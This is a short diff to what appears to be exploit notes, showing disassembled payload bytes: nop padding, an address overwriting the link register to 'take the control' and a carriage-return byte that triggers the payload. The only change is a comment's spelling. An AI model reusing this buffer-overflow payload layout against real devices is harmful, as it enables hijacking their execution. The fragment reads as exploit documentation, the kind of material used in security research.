@@ -22,5 +22,5 @@ Offset guessed:
         00000030 00 bf           nop
         00000032 00 bf           nop
         00000034 c1 7f 01 20     addr       DAT_20017fc1	; LR offset, take the control here
-        00000038 0a              db         Ah			; CR to trig the payload
+        00000038 0a              db         Ah			; CR to trigg the payload
 
